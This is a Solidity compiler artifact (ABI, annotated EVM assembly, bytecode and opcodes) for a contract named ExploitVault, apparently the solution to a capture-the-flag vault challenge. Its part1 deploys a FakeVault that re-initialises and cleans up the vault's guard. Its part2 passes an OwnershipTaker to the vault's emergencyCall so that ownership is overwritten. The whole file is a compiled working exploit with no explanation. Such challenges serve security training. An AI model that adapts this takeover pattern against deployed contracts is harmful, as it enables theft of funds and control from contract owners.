{
  "contracts/vault/ExploitVault.sol": {
    "ExploitVault": {
      "abi": [
        {
          "constant": false,
          "inputs": [],
          "name": "part2",
          "outputs": [],
          "payable": false,
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "constant": false,
          "inputs": [],
          "name": "part1",
          "outputs": [],
          "payable": false,
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "name": "setup_",
              "type": "address"
            }
          ],
          "payable": false,
          "stateMutability": "nonpayable",
          "type": "constructor"
        }
      ],
      "devdoc": {
        "methods": {}
      },
      "evm": {
        "assembly": "    /* \"contracts/vault/ExploitVault.sol\":573:1001  contract ExploitVault {... */\n  mstore(0x40, 0x60)\n    /* \"contracts/vault/ExploitVault.sol\":632:720  function ExploitVault(address setup_) public {... */\n  jumpi(tag_1, iszero(callvalue))\n  0x0\n  dup1\n  revert\ntag_1:\n  mload(0x40)\n  0x20\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  0x40\n  mstore\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap2\n  swap1\n  pop\n  pop\ntag_2:\n    /* \"contracts/vault/ExploitVault.sol\":706:712  setup_ */\n  dup1\n    /* \"contracts/vault/ExploitVault.sol\":687:692  setup */\n  0x0\n  dup1\n    /* \"contracts/vault/ExploitVault.sol\":687:713  setup = SetupVault(setup_) */\n  0x100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/vault/ExploitVault.sol\":632:720  function ExploitVault(address setup_) public {... */\ntag_3:\n  pop\n    /* \"contracts/vault/ExploitVault.sol\":573:1001  contract ExploitVault {... */\ntag_4:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/vault/ExploitVault.sol\":573:1001  contract ExploitVault {... */\n      mstore(0x40, 0x60)\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x3b6cf550\n      eq\n      tag_2\n      jumpi\n      dup1\n      0xd83408fb\n      eq\n      tag_3\n      jumpi\n    tag_1:\n      0x0\n      dup1\n      revert\n        /* \"contracts/vault/ExploitVault.sol\":855:999  function part2() public {... */\n    tag_2:\n      jumpi(tag_4, iszero(callvalue))\n      0x0\n      dup1\n      revert\n    tag_4:\n      tag_5\n      jump(tag_6)\n    tag_5:\n      stop\n        /* \"contracts/vault/ExploitVault.sol\":726:849  function part1() public {... */\n    tag_3:\n      jumpi(tag_7, iszero(callvalue))\n      0x0\n      dup1\n      revert\n    tag_7:\n      tag_8\n      jump(tag_9)\n    tag_8:\n      stop\n        /* \"contracts/vault/ExploitVault.sol\":855:999  function part2() public {... */\n    tag_6:\n        /* \"contracts/vault/ExploitVault.sol\":889:909  OwnershipTaker taker */\n      0x0\n        /* \"contracts/vault/ExploitVault.sol\":912:932  new OwnershipTaker() */\n      tag_11\n      jump\t// in(tag_12)\n    tag_11:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      0x0\n      create\n      dup1\n      iszero\n      iszero\n      tag_13\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_13:\n        /* \"contracts/vault/ExploitVault.sol\":889:932  OwnershipTaker taker = new OwnershipTaker() */\n      swap1\n      pop\n        /* \"contracts/vault/ExploitVault.sol\":942:947  setup */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/vault/ExploitVault.sol\":942:953  setup.vault */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xfbfa77cf\n        /* \"contracts/vault/ExploitVault.sol\":942:955  setup.vault() */\n      mstore(add(0x20, mload(0x40)), 0x0)\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n      iszero\n      tag_14\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_14:\n      sub(gas, 0x2c6)\n      call\n      iszero\n      iszero\n      tag_15\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_15:\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      mload\n      swap1\n      pop\n        /* \"contracts/vault/ExploitVault.sol\":942:969  setup.vault().emergencyCall */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xc4bf0220\n        /* \"contracts/vault/ExploitVault.sol\":978:983  taker */\n      dup3\n        /* \"contracts/vault/ExploitVault.sol\":942:992  setup.vault().emergencyCall(address(taker), hex\"\") */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x0\n      dup2\n      mstore\n      0x20\n      add\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n      iszero\n      tag_16\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_16:\n      sub(gas, 0x2c6)\n      call\n      iszero\n      iszero\n      tag_17\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_17:\n      pop\n      pop\n      pop\n        /* \"contracts/vault/ExploitVault.sol\":855:999  function part2() public {... */\n    tag_10:\n      pop\n      jump\t// out\n        /* \"contracts/vault/ExploitVault.sol\":726:849  function part1() public {... */\n    tag_9:\n        /* \"contracts/vault/ExploitVault.sol\":760:779  FakeVault fakeVault */\n      0x0\n        /* \"contracts/vault/ExploitVault.sol\":796:801  setup */\n      dup1\n      0x0\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/vault/ExploitVault.sol\":796:810  setup.registry */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x7b103999\n        /* \"contracts/vault/ExploitVault.sol\":796:812  setup.registry() */\n      mstore(add(0x20, mload(0x40)), 0x0)\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n      iszero\n      tag_19\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_19:\n      sub(gas, 0x2c6)\n      call\n      iszero\n      iszero\n      tag_20\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_20:\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      mload\n      swap1\n      pop\n        /* \"contracts/vault/ExploitVault.sol\":782:813  new FakeVault(setup.registry()) */\n      tag_21\n      jump\t// in(tag_22)\n    tag_21:\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      0x0\n      create\n      dup1\n      iszero\n      iszero\n      tag_23\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_23:\n        /* \"contracts/vault/ExploitVault.sol\":760:813  FakeVault fakeVault = new FakeVault(setup.registry()) */\n      swap1\n      pop\n        /* \"contracts/vault/ExploitVault.sol\":823:832  fakeVault */\n      dup1\n        /* \"contracts/vault/ExploitVault.sol\":823:840  fakeVault.cleanup */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3cecd719\n        /* \"contracts/vault/ExploitVault.sol\":823:842  fakeVault.cleanup() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n      iszero\n      tag_24\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_24:\n      sub(gas, 0x2c6)\n      call\n      iszero\n      iszero\n      tag_25\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_25:\n      pop\n      pop\n      pop\n        /* \"contracts/vault/ExploitVault.sol\":726:849  function part1() public {... */\n    tag_18:\n      pop\n      jump\t// out\n        /* \"contracts/vault/ExploitVault.sol\":573:1001  contract ExploitVault {... */\n    tag_12:\n      mload(0x40)\n      dataSize(sub_0)\n      dup1\n      dataOffset(sub_0)\n      dup4\n      codecopy\n      add\n      swap1\n      jump\t// out\n    tag_22:\n      mload(0x40)\n      dataSize(sub_1)\n      dup1\n      dataOffset(sub_1)\n      dup4\n      codecopy\n      add\n      swap1\n      jump\t// out\n    stop\n\n    sub_0: assembly {\n            /* \"contracts/vault/ExploitVault.sol\":448:571  contract OwnershipTaker {... */\n          mstore(0x40, 0x60)\n          jumpi(tag_1, iszero(callvalue))\n          0x0\n          dup1\n          revert\n        tag_1:\n        tag_2:\n          dataSize(sub_0)\n          dup1\n          dataOffset(sub_0)\n          0x0\n          codecopy\n          0x0\n          return\n        stop\n\n        sub_0: assembly {\n                /* \"contracts/vault/ExploitVault.sol\":448:571  contract OwnershipTaker {... */\n              mstore(0x40, 0x60)\n              jumpi(tag_1, iszero(calldatasize))\n              calldataload(0x0)\n              0x100000000000000000000000000000000000000000000000000000000\n              swap1\n              div\n              0xffffffff\n              and\n              dup1\n              0x8da5cb5b\n              eq\n              tag_2\n              jumpi\n            tag_1:\n                /* \"contracts/vault/ExploitVault.sol\":505:569  function() public payable {... */\n            tag_3:\n                /* \"contracts/vault/ExploitVault.sol\":557:561  0x00 */\n              0x0\n                /* \"contracts/vault/ExploitVault.sol\":541:546  owner */\n              dup1\n              0x0\n                /* \"contracts/vault/ExploitVault.sol\":541:562  owner = address(0x00) */\n              0x100\n              exp\n              dup2\n              sload\n              dup2\n              0xffffffffffffffffffffffffffffffffffffffff\n              mul\n              not\n              and\n              swap1\n              dup4\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              mul\n              or\n              swap1\n              sstore\n              pop\n                /* \"contracts/vault/ExploitVault.sol\":505:569  function() public payable {... */\n            tag_4:\n                /* \"contracts/vault/ExploitVault.sol\":448:571  contract OwnershipTaker {... */\n              stop\n                /* \"contracts/vault/ExploitVault.sol\":478:498  address public owner */\n            tag_2:\n              jumpi(tag_5, iszero(callvalue))\n              0x0\n              dup1\n              revert\n            tag_5:\n              tag_6\n              jump(tag_7)\n            tag_6:\n              mload(0x40)\n              dup1\n              dup3\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              dup2\n              mstore\n              0x20\n              add\n              swap2\n              pop\n              pop\n              mload(0x40)\n              dup1\n              swap2\n              sub\n              swap1\n              return\n            tag_7:\n              0x0\n              dup1\n              swap1\n              sload\n              swap1\n              0x100\n              exp\n              swap1\n              div\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              dup2\n              jump\t// out\n\n            auxdata: 0xa165627a7a72305820dbb59fb5a685060e8d753db2e027a8f4a06c42bd5ea211c7a336438e88aedb2d0029\n        }\n    }\n\n    sub_1: assembly {\n            /* \"contracts/vault/ExploitVault.sol\":53:446  contract FakeVault {... */\n          mstore(0x40, 0x60)\n            /* \"contracts/vault/ExploitVault.sol\":103:243  function FakeVault(GuardRegistry registry) public {... */\n          jumpi(tag_1, iszero(callvalue))\n          0x0\n          dup1\n          revert\n        tag_1:\n          mload(0x40)\n          0x20\n          dup1\n          bytecodeSize\n          dup4\n          codecopy\n          dup2\n          add\n          0x40\n          mstore\n          dup1\n          dup1\n          mload\n          swap1\n          0x20\n          add\n          swap1\n          swap2\n          swap1\n          pop\n          pop\n        tag_2:\n            /* \"contracts/vault/ExploitVault.sol\":177:185  registry */\n          dup1\n            /* \"contracts/vault/ExploitVault.sol\":177:201  registry.implementations */\n          0xffffffffffffffffffffffffffffffffffffffff\n          and\n          0x2cfeaca\n            /* \"contracts/vault/ExploitVault.sol\":202:210  registry */\n          dup3\n            /* \"contracts/vault/ExploitVault.sol\":202:232  registry.defaultImplementation */\n          0xffffffffffffffffffffffffffffffffffffffff\n          and\n          0xb39c4593\n            /* \"contracts/vault/ExploitVault.sol\":202:234  registry.defaultImplementation() */\n          mstore(add(0x20, mload(0x40)), 0x0)\n          mload(0x40)\n          dup2\n          0xffffffff\n          and\n          0x100000000000000000000000000000000000000000000000000000000\n          mul\n          dup2\n          mstore\n          0x4\n          add\n          0x20\n          mload(0x40)\n          dup1\n          dup4\n          sub\n          dup2\n          0x0\n          dup8\n          dup1\n          extcodesize\n          iszero\n          iszero\n          tag_4\n          jumpi\n          0x0\n          dup1\n          revert\n        tag_4:\n          sub(gas, 0x2c6)\n          call\n          iszero\n          iszero\n          tag_5\n          jumpi\n          0x0\n          dup1\n          revert\n        tag_5:\n          pop\n          pop\n          pop\n          mload(0x40)\n          dup1\n          mload\n          swap1\n          pop\n            /* \"contracts/vault/ExploitVault.sol\":177:235  registry.implementations(registry.defaultImplementation()) */\n          mstore(add(0x20, mload(0x40)), 0x0)\n          mload(0x40)\n          dup3\n          0xffffffff\n          and\n          0x100000000000000000000000000000000000000000000000000000000\n          mul\n          dup2\n          mstore\n          0x4\n          add\n          dup1\n          dup3\n          not(0x0)\n          and\n          not(0x0)\n          and\n          dup2\n          mstore\n          0x20\n          add\n          swap2\n          pop\n          pop\n          0x20\n          mload(0x40)\n          dup1\n          dup4\n          sub\n          dup2\n          0x0\n          dup8\n          dup1\n          extcodesize\n          iszero\n          iszero\n          tag_6\n          jumpi\n          0x0\n          dup1\n          revert\n        tag_6:\n          sub(gas, 0x2c6)\n          call\n          iszero\n          iszero\n          tag_7\n          jumpi\n          0x0\n          dup1\n          revert\n        tag_7:\n          pop\n          pop\n          pop\n          mload(0x40)\n          dup1\n          mload\n          swap1\n          pop\n            /* \"contracts/vault/ExploitVault.sol\":163:168  guard */\n          0x0\n          dup1\n            /* \"contracts/vault/ExploitVault.sol\":163:236  guard = Guard(registry.implementations(registry.defaultImplementation())) */\n          0x100\n          exp\n          dup2\n          sload\n          dup2\n          0xffffffffffffffffffffffffffffffffffffffff\n          mul\n          not\n          and\n          swap1\n          dup4\n          0xffffffffffffffffffffffffffffffffffffffff\n          and\n          mul\n          or\n          swap1\n          sstore\n          pop\n            /* \"contracts/vault/ExploitVault.sol\":103:243  function FakeVault(GuardRegistry registry) public {... */\n        tag_3:\n          pop\n            /* \"contracts/vault/ExploitVault.sol\":53:446  contract FakeVault {... */\n        tag_8:\n          dataSize(sub_0)\n          dup1\n          dataOffset(sub_0)\n          0x0\n          codecopy\n          0x0\n          return\n        stop\n\n        sub_0: assembly {\n                /* \"contracts/vault/ExploitVault.sol\":53:446  contract FakeVault {... */\n              mstore(0x40, 0x60)\n              calldataload(0x0)\n              0x100000000000000000000000000000000000000000000000000000000\n              swap1\n              div\n              0xffffffff\n              and\n              dup1\n              0x3cecd719\n              eq\n              tag_2\n              jumpi\n              dup1\n              0x7ceab3b1\n              eq\n              tag_3\n              jumpi\n              dup1\n              0x8da5cb5b\n              eq\n              tag_4\n              jumpi\n            tag_1:\n              0x0\n              dup1\n              revert\n                /* \"contracts/vault/ExploitVault.sol\":253:359  function cleanup() public {... */\n            tag_2:\n              jumpi(tag_5, iszero(callvalue))\n              0x0\n              dup1\n              revert\n            tag_5:\n              tag_6\n              jump(tag_7)\n            tag_6:\n              stop\n                /* \"contracts/vault/ExploitVault.sol\":78:96  Guard public guard */\n            tag_3:\n              jumpi(tag_8, iszero(callvalue))\n              0x0\n              dup1\n              revert\n            tag_8:\n              tag_9\n              jump(tag_10)\n            tag_9:\n              mload(0x40)\n              dup1\n              dup3\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              dup2\n              mstore\n              0x20\n              add\n              swap2\n              pop\n              pop\n              mload(0x40)\n              dup1\n              swap2\n              sub\n              swap1\n              return\n                /* \"contracts/vault/ExploitVault.sol\":365:444  function owner() public returns (address) {... */\n            tag_4:\n              jumpi(tag_11, iszero(callvalue))\n              0x0\n              dup1\n              revert\n            tag_11:\n              tag_12\n              jump(tag_13)\n            tag_12:\n              mload(0x40)\n              dup1\n              dup3\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              dup2\n              mstore\n              0x20\n              add\n              swap2\n              pop\n              pop\n              mload(0x40)\n              dup1\n              swap2\n              sub\n              swap1\n              return\n                /* \"contracts/vault/ExploitVault.sol\":253:359  function cleanup() public {... */\n            tag_7:\n                /* \"contracts/vault/ExploitVault.sol\":289:294  guard */\n              0x0\n              dup1\n              swap1\n              sload\n              swap1\n              0x100\n              exp\n              swap1\n              div\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n                /* \"contracts/vault/ExploitVault.sol\":289:305  guard.initialize */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              0xc4d66de8\n                /* \"contracts/vault/ExploitVault.sol\":320:324  this */\n              address\n                /* \"contracts/vault/ExploitVault.sol\":289:327  guard.initialize(Vault(address(this))) */\n              mload(0x40)\n              dup3\n              0xffffffff\n              and\n              0x100000000000000000000000000000000000000000000000000000000\n              mul\n              dup2\n              mstore\n              0x4\n              add\n              dup1\n              dup3\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              dup2\n              mstore\n              0x20\n              add\n              swap2\n              pop\n              pop\n              0x0\n              mload(0x40)\n              dup1\n              dup4\n              sub\n              dup2\n              0x0\n              dup8\n              dup1\n              extcodesize\n              iszero\n              iszero\n              tag_15\n              jumpi\n              0x0\n              dup1\n              revert\n            tag_15:\n              sub(gas, 0x2c6)\n              call\n              iszero\n              iszero\n              tag_16\n              jumpi\n              0x0\n              dup1\n              revert\n            tag_16:\n              pop\n              pop\n              pop\n                /* \"contracts/vault/ExploitVault.sol\":337:342  guard */\n              0x0\n              dup1\n              swap1\n              sload\n              swap1\n              0x100\n              exp\n              swap1\n              div\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n                /* \"contracts/vault/ExploitVault.sol\":337:350  guard.cleanup */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              0x3cecd719\n                /* \"contracts/vault/ExploitVault.sol\":337:352  guard.cleanup() */\n              mload(0x40)\n              dup2\n              0xffffffff\n              and\n              0x100000000000000000000000000000000000000000000000000000000\n              mul\n              dup2\n              mstore\n              0x4\n              add\n              0x0\n              mload(0x40)\n              dup1\n              dup4\n              sub\n              dup2\n              0x0\n              dup8\n              dup1\n              extcodesize\n              iszero\n              iszero\n              tag_17\n              jumpi\n              0x0\n              dup1\n              revert\n            tag_17:\n              sub(gas, 0x2c6)\n              call\n              iszero\n              iszero\n              tag_18\n              jumpi\n              0x0\n              dup1\n              revert\n            tag_18:\n              pop\n              pop\n              pop\n                /* \"contracts/vault/ExploitVault.sol\":253:359  function cleanup() public {... */\n            tag_14:\n              jump\t// out\n                /* \"contracts/vault/ExploitVault.sol\":78:96  Guard public guard */\n            tag_10:\n              0x0\n              dup1\n              swap1\n              sload\n              swap1\n              0x100\n              exp\n              swap1\n              div\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              dup2\n              jump\t// out\n                /* \"contracts/vault/ExploitVault.sol\":365:444  function owner() public returns (address) {... */\n            tag_13:\n                /* \"contracts/vault/ExploitVault.sol\":398:405  address */\n              0x0\n                /* \"contracts/vault/ExploitVault.sol\":432:436  this */\n              address\n                /* \"contracts/vault/ExploitVault.sol\":417:437  return address(this) */\n              swap1\n              pop\n                /* \"contracts/vault/ExploitVault.sol\":365:444  function owner() public returns (address) {... */\n            tag_19:\n              swap1\n              jump\t// out\n\n            auxdata: 0xa165627a7a72305820c06ada0081e48a81e21d9ce4c211a38717bf0ad3346d7d5fdadb52381ea2faac0029\n        }\n    }\n\n    auxdata: 0xa165627a7a72305820defa98bb35ab371e4411192d7f157f57ba4ccf1451194b3a4c28c5b8d91dd3210029\n}\n",
        "bytecode": {
          "linkReferences": {},
          "object": "6060604052341561000f57600080fd5b6040516020806109ff833981016040528080519060200190919050505b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b505b6109818061007e6000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633b6cf55014610049578063d83408fb1461005e575b600080fd5b341561005457600080fd5b61005c610073565b005b341561006957600080fd5b610071610202565b005b600061007d61037d565b604051809103906000f080151561009357600080fd5b90506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fbfa77cf6000604051602001526040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b151561012257600080fd5b6102c65a03f1151561013357600080fd5b5050506040518051905073ffffffffffffffffffffffffffffffffffffffff1663c4bf0220826040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018060200182810382526000815260200160200192505050600060405180830381600087803b15156101ea57600080fd5b6102c65a03f115156101fb57600080fd5b5050505b50565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16637b1039996000604051602001526040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b151561029157600080fd5b6102c65a03f115156102a257600080fd5b505050604051805190506102b461038d565b808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050604051809103906000f080151561030057600080fd5b90508073ffffffffffffffffffffffffffffffffffffffff16633cecd7196040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561036557600080fd5b6102c65a03f1151561037657600080fd5b5050505b50565b6040516101448061039e83390190565b604051610474806104e28339019056006060604052341561000f57600080fd5b5b6101258061001f6000396000f30060606040523615603d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680638da5cb5b146082575b5b60008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b005b3415608c57600080fd5b609260d4565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a72305820dbb59fb5a685060e8d753db2e027a8f4a06c42bd5ea211c7a336438e88aedb2d00296060604052341561000f57600080fd5b604051602080610474833981016040528080519060200190919050505b8073ffffffffffffffffffffffffffffffffffffffff166302cfeaca8273ffffffffffffffffffffffffffffffffffffffff1663b39c45936000604051602001526040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15156100b457600080fd5b6102c65a03f115156100c557600080fd5b505050604051805190506000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808260001916600019168152602001915050602060405180830381600087803b151561013157600080fd5b6102c65a03f1151561014257600080fd5b505050604051805190506000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b505b6102d78061019d6000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633cecd719146100545780637ceab3b1146100695780638da5cb5b146100be575b600080fd5b341561005f57600080fd5b610067610113565b005b341561007457600080fd5b61007c61027d565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156100c957600080fd5b6100d16102a2565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c4d66de8306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15156101ce57600080fd5b6102c65a03f115156101df57600080fd5b5050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633cecd7196040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561026657600080fd5b6102c65a03f1151561027757600080fd5b5050505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60003090505b905600a165627a7a72305820c06ada0081e48a81e21d9ce4c211a38717bf0ad3346d7d5fdadb52381ea2faac0029a165627a7a72305820defa98bb35ab371e4411192d7f157f57ba4ccf1451194b3a4c28c5b8d91dd3210029",
          "opcodes": "PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH2 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP1 PUSH2 0x9FF DUP4 CODECOPY DUP2 ADD PUSH1 0x40 MSTORE DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP2 SWAP1 POP POP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMPDEST POP JUMPDEST PUSH2 0x981 DUP1 PUSH2 0x7E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x3B6CF550 EQ PUSH2 0x49 JUMPI DUP1 PUSH4 0xD83408FB EQ PUSH2 0x5E JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE ISZERO PUSH2 0x54 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x5C PUSH2 0x73 JUMP JUMPDEST STOP JUMPDEST CALLVALUE ISZERO PUSH2 0x69 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x71 PUSH2 0x202 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH2 0x7D PUSH2 0x37D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO ISZERO PUSH2 0x93 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xFBFA77CF PUSH1 0x0 PUSH1 0x40 MLOAD PUSH1 0x20 ADD MSTORE PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x122 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0x133 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP PUSH1 0x40 MLOAD DUP1 MLOAD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC4BF0220 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x0 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x1EA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO 